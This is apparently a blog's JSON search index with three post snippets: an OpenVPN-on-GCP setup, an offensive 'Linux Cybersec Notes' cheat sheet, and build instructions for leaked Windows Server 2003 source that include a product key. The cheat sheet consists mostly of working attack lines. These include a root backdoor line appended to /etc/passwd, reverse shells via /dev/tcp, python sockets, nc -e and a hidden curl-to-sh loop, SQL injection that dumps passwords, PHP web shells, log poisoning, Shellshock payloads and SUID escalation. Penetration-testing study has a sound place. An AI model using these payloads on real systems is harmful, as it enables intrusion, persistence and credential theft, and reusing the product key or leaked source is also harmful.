[ { "title": "Create Your own private VPN using GCP instance", "url": "/posts/Setup-Openvpn-on-GCP/", "categories": "Tutorial, Instructions, Notes", "tags": "writing", "date": "2022-02-18 17:30:00 +0530", "snippet": "Setup a GCP cloud Instance Create a GCP cloud instance and open your preferred port by going into the firewall and setting up the Inbound rules for that port. The preferred port is UDP port 1194 as it is the default used by the openvpn server. If you plan to go with your own choice of ports, remember it as it will be used later.Paste the below command in your terminalwget https://git.io/vpn -O openvpn-install.sh &amp;amp;&amp;amp; bash openvpn-install.shFollow Instructions on terminal Follow on with the steps given by the setup script. At the appropriate prompt enter the chosen protocol and port. The default will be UDP port 1194. Change it if you had decided to use other port. Generate the .ovpn key files at the appropriate prompt.Generate .ovpn later in time Later if you want to regenerate the .ovpn files rerun the above script and proceed with the prompt." }, { "title": "Linux Cybersec Notes", "url": "/posts/Linux-Cybersec-Notes/", "categories": "OSCP, Instructions, Notes", "tags": "writing", "date": "2022-01-07 13:10:00 +0530", "snippet": "For binary specific taskssudo -lsee for the sudo entries that sre allowed to execute binaries as sudo and check for entries on https://gtfobins.github.io/search for that particular binary and use the suggested method there.Persistence can be obtained by making entries in /etc/passwd file, do the followingecho &quot;realize:drkhtmpyc4URU:0:0:root:/root:/bin/bash&quot; &amp;gt;&amp;gt; /etc/passwdThis will give persistence via ssh as user realize while password being 1234reverse shell techniquesAutomated Methodon local machinefire up netcat with tags -lvnp and port [any] nc -lvnp [port]on attack machine execute https://reverse-shell.sh/[local-ip]:[local-port]for recursive call, do this while true; do curl https://reverse-shell.sh/[local-ip]:[local-port] | sh; donefor no traces on network scanners or any trace od some shell open, do this sh -c &quot;curl https://reverse-shell.sh/localhost:1337 | sh -i &amp;amp;&quot; &amp;amp;&amp;amp; exitthis will exit the shell while running the script recursively in backgroundthis will give a reverse shell, it works as someone has hosted a website with raw ascii bash script containing 4 reverse shell methods.- python2- netcat- perl- shManual methodsuntil I learn the scripts, following manual method works,go to https://www.revshells.com/make the appropriate entries and tryout appropriate snippetsStabilize the reverse shell by the following methodspython -c &#39;import pty;pty.spawn(&quot;/bin/bash&quot;)&#39;export SHELL=/bin/bashexport TERM=xterm-256colorrestricted shell bypassin a restricted shell condition, there apre few binaries that are used there, to bypass the fuckery of restricted shells, do the followingfor [echo] echo os.system(&#39;/bin/bash&#39;)for [exec] exec &quot;/bin/sh&quot;;for [perl] perl -e &#39;exec &quot;/bin/sh&quot;;&#39;direct from ssh with aachine having netcat ssh [attack-user]@[attack-ip] nc [local-ip] [local-port] -e /bin/shSQL Injectionworks with MySQLstart with 1&#39; or &#39;1&#39; = &#39;1if result returns form is vulnerabletry union method 1&#39; UNION ALL SELECT 1 -- -see if output conesif result is null, increase the number till something comes up, the count determines the number of columns 1&#39; UNION ALL SELECT 1,2,3,4,5,6 -- -now the column is determined, we will go for other details 1&#39; UNION ALL SELECT @@version,2,3,4,5,6 -- - the above payload will throw up database version 1&#39; UNION ALL SELECT concat(SCHEMA_NAME),2,3,4,5,6 FROM information_schema.schemata -- - the above payload will fetch for database names in information schema database 1&#39; UNION ALL SELECT concat(TABLE_NAME),2,3,4,5,6 FROM information_schema.TABLES WHERE table_schema=&#39;Staff&#39; -- - the above query throws up table names in that database 1&#39; UNION ALL SELECT concat(COLUMN_NAME),2,3,4,5,6 FROM information_schema.COLUMNS WHERE table_name=&#39;StaffDetails&#39; -- - this throws up the column names by fetching it from information schema databasenow we have all the essential information about the database and the table layouttime to dump tables 1&#39; UNION ALL SELECT group_concat(Username,&quot; : &quot;,Password),2,3,4,5,6 FROM users.UserDetails -- - this dumps the tablesometimes ports are locked and we need to perform port knocking by ncconfig file present at /etc/knockd.confconsists of ports required to knockWeb enumeration we can use gobuster as usual but if we are lost or we need more aggressive enumeration, wfuzz is the way to goPhp shellcode for RCE after knowing the vulnerable file, if it is vulnerable, inject this and use it for payload &amp;lt;?php echo shell_exec($_GET[&#39;cmd&#39;]); ?&amp;gt; if situation for LFI try to get the credentials file ls lsReverse shell payloadsbash (works in all cases) bash -i &amp;gt;&amp;amp; /dev/tcp/10.10.10.3/1234 0&amp;gt;&amp;amp;1python python3 -c &#39;import os,pty,socket;s=socket.socket();s.connect((&quot;192.168.56.107&quot;,1234));[os.dup2(s.fileno(),f)for f in(0,1,2)];pty.spawn(&quot;/bin/bash&quot;)&#39;Local shell payload import os os.system(&#39;cp /bin/bash /tmp/bash&#39;) os.system(&#39;chmod +s /tmp/bash&#39;)this will create a bash with suid bit set in /tmp folder do ./bash -p to get root shellRCE through smtpwe connect to port 25 via telnet telnet [host] [port]send one mail with the payload do as follows MAIL FRON: &amp;lt;qewr&amp;gt; RCPT TO: Helios data &amp;lt;?php system($_GET[&#39;cmd&#39;]); ?&amp;gt; . now close the terminalnow go to LFI link and give in 1 extra parameter &quot;cmd&quot; like this http://symfonos.local/h3l105/wp-content/plugins/mail-masta/inc/campaign/count_of_send.php?pl=/var/mail/helios&amp;amp;cmd=idopen nc inject reverse shell payload in above link and wait for callbackPrivledge escalation through suid binary and path overriding as binary name was used echo -n &quot;/bin/sh&quot; &amp;gt; binary chmod 755 binary export PATH=/tmp:$PATH /location/of/suid/binarySuid binary find find /opt -perm -u=s -type f 2&amp;gt;/dev/nullCheck for listening ports on the machine netstat -tulpn ss -tulpn for ssh port forwarding, 2 nethods are there - ssh -L [local-port]:[hosted-remote-ip]:[hosted-remote-port] [remote-user]@[remote-host] OR - if logged into SSH press ENTER ~ C - SSH prompt opens - give in the command] -L [local-port]:[hosted-remote-ip]:[hosted-remote-port] - press enter, port is forwarded, use firefox or any unproxied browserShellshock vulnerabilityinject the following payload into the user agent part of the page and use netcat to get shell () { :; }; echo; echo; /bin/bash -c &#39;cat /etc/passwd&#39; () { :; }; echo; echo; /bin/bash -c &#39;/bin/nc -e /bin/bash 192.168.56.107 4321&#39;User specific files find / -user hades 2&amp;gt;/dev/nullTo sniff traffic off port tcpdump -v -i [interface] port [port-no]LDAP injection through LDAP poisoning Credentials for login can be * and *to connect to LDAP via credentials ldapsearch -x -h symfonos -D &quot;CN=admin,DC=symfonos,DC=local&quot; -w qMDdyZh3cT6eeAWD -b &quot;DC=symfonos,DC=local&quot;php wrapper to see php pages during LFI /home.php?url=php://filter/convert.base64-encode/resource=home.phpto sudo with particular user rights sudo -u [user] /bin/bashexploiting python apps for privledge escalationgive input as eval(&#39;__import__(&quot;os&quot;).system(&quot;id&quot;)&#39;)find writable directories in the system find / -perm -2 -type d 2&amp;gt;/dev/nullexploit php command execution vulnerabilityhttp://192.168.229.129:8/breach3/thebobscloudhostingllc/livechat.php?searcher=echo&#39;&amp;lt;?php echo shell_exec($_GET[&#39;e&#39;]); ?&amp;gt;&#39; &amp;gt;test.txtreverse forward a port through reverse shellon your machine chisel server --reverse --port 8000on attacking machine ./chisel client 10.14.13.211:8000 R:2049:127.0.0.1:2049search for a particular stringgrep -iRl &#39;pat&#39; /directory enumeration is affected by ssl, use appropriate domain before enumerationRCE through mysql queriesSELECT &quot;&amp;lt;?php system($_GET[&#39;cmd&#39;]); ?&amp;gt;&quot; INTO OUTFILE &quot;/var/www/html/wordpress/shell.php&quot;LFIuse php wrappers during lfi to read php specific files that are otherwise unreadable file=filter/read=string.rot13/resource=/etc/passwdlog poisoningwe can inject malicious payload into popular applications log files and retrieve them through LFI to get RCEThis is log poisoningchange user agent to this curl -A &quot;&amp;lt;?php phpinfo();?&amp;gt;&quot; http://10-10-89-133.p.thmlabs.com/login.php curl -A &quot;&amp;lt;?php system($_GET[&#39;cmd&#39;]); ?&amp;gt;&quot; http://10-10-89-133.p.thmlabs.com/login.php page link file=/var/log.log&amp;amp;cmd=ifconfig" }, { "title": "Windows Server 2003 (NT 5.2 / 3790) guide", "url": "/posts/Windows-server-2003/", "categories": "Tutorial, Instructions, Notes", "tags": "writing", "date": "2022-01-07 00:10:00 +0530", "snippet": "Windows Server 2003 (NT 5.2 / 3790) guidePreparing Environment Extract source tree, in this guide we will assume C:\\NT (if you wish for your binaries to match RTM as closely as possible, use D:\\srv03rtm) Unset Read Only on extracted directory (including subfolders and files) Copy over files from this ZIP into source tree, overwriting existing files as necessary Manually import \\tools\\driver.pfx certificate and private key (if asked for password, simply continue without typing anything) Create desktop shortcut for %windir%\\system32\\cmd.exe /k C:\\NT\\tools\\razzle.cmd free offline (see below for explanation) and change Start in to C:\\NT Open razzle window using shortcut you createdBuildingClean buildPerforms clean rebuild of all components: build /cZP“Dirty” buildBuilds only components that have changed since last clean build: build /ZPPost-build Mount RTM CD and execute tools\\missing.cmd (optionally, perform this step for every SKU) tools\\postbuild.cmd (use -sku:{sku} if you want to process only specific one, expect filechk errors if you ignore this and have skipped on missing.cmd optional step)Getting ISO files Execute tools\\oscdimg.cmd {sku} where {sku} is one of: srv - Windows Server 2003 Standard Edition sbs - Windows Server 2003 Small Business Edition ads - Windows Server 2003 Enterprise Edition dtc - Windows Server 2003 Datacenter Edition bla - Windows Server 2003 Web Edition per - Windows XP Home Edition pro - Windows XP Professional AdditionsTimebomb Can be enabled or disabled by commenting or uncommenting timebomb.cmd entry in \\tools\\postbuildscripts\\pbuild.dat If enabled, time can be adjusted by editing \\tools\\postbuildscripts\\timebomb.cmdDifferent build optionsYou can modify your razzle shortcut (or execute command manually inside C:\\NT) to include (or remove) additional argument(s): free - build ‘free’ bits (production, ommiting it will generated checked bits) CkhKernel - build ‘checked’ (testing) kernel/hal/ntdll when building ‘free’ bits no_opts - disable binary optimization (useful for debugging, but will most likely fail a full build, some code can’t be built without optimization) verbose - enable verbose execution of the build process binaries_dir &amp;lt;basepath&amp;gt; - specifies custom output directory (default is binaries, the suffix added after . is non-customizable)Other options are not described here, see razzle.cmd /? for details.Creating fresh postbuild tools\\postbuild.cmd -full tools\\missing.cmd tools\\postbuild.cmdUse -sku:{sku} if you want to process only specific oneBuilding specific componentsMost components can be built seperately. For example, if you wish to rebuild ntos component, perform these steps: cd base\\ntos (you can also use ntos alias that razzle has set up for you) bczGenerally postbuild.cmd is clever enough to include your changes properly without needing fresh build as it uses bindiff to find differences.Generating new build number/nameVersion information is stored in \\public\\sdk\\inc\\ntverp.hYou can also use nmake set_builddate set_buildnum set_buildname -f makefil0 to generate new build name quickly.Original CD filenames 5.2.3790.0.srv03_rtm.030324-2048_x86fre_server-standard_retail_en-us-NRMSFPP_EN.iso (SHA1: A600409482A5678EF6AF2B26D3576D6D9894178D) 5.2.3790.0.srv03_rtm.030324-2048_x86fre_server-datacenter_retail_en-us-NRMDOEM_EN.iso (SHA1: E2B47A7CE45C6C6305594CEE4C1B64894805AAF4) 5.2.3790.0.srv03_rtm.030324-2048_x86fre_server-enterpriseserver_retail_en-us-NRMEFPP_EN.iso (SHA1: 0309FFB4181BA5122C692A6E1079E9FC1D53FCE4) 5.2.3790.0.srv03_rtm.030324-2048_x86fre_server-webserver_retail_en-us-NRMWFPP_EN.iso (SHA1: 46C1CCB2CFC96803E304A35BEF50CD71B2C1DE38) 5.1.2600.0.xpclient.010817-1148_x86fre_client-home_retail_en-us-WXHFPP_EN.iso (SHA1: B273C8D41E3844E3E46722F52F5A4CF9F206C8D0) 5.1.2600.0.xpclient.010817-1148_x86fre_client-professional_retail_en-us-WXPFPP_EN.iso (SHA1: 1400DED4402D50F3864ED3D8DCF5CC52BA79A04A) sbs.iso (coverted from mdf; SHA1: CDB30C80FDE314C16CA11F5CD31650ECBEC7A214)Product keys Standard Edition: M6RJ9-TBJH3-9DDXM-4VX9Q-K8M8M" } ]
